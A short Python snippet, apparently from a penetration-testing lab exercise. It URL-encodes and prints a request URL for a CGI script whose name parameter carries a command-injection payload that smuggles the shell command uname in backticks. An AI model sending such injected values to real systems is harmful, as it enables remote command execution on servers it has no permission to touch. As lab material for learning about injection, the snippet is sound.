import urllib.parse

url = "http://ptl-9eab7e2d-66b67f13.libcurl.so/cgi-bin/hello?name=hacker1'.`uname`.'"

# Encode the URL
encoded_url = urllib.parse.quote(url)

print(encoded_url)